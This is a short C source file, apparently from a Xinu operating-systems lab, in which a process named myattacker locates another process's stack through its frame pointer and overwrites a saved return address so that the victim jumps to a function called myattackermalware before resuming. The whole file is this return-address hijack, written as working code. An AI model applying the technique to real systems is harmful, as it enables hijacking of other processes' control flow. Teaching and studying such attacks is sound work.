/* myattacker.c - myattacker */

#include <xinu.h> 
static unsigned long	*ebp;
/*------------------------------------------------------------------------
 *  myattacker  -  a process create by main
 *------------------------------------------------------------------------
 */
void myattacker()
{
	unsigned long *return_add; //the return address of victim

	asm("movl %ebp,ebp;");

	return_add = ebp+497;
	unsigned long old_return = *return_add;
	*return_add = &myattackermalware; //set the return value after sleep is called to malware code

	return_add = ebp+498;
	*return_add = old_return;
	return;
}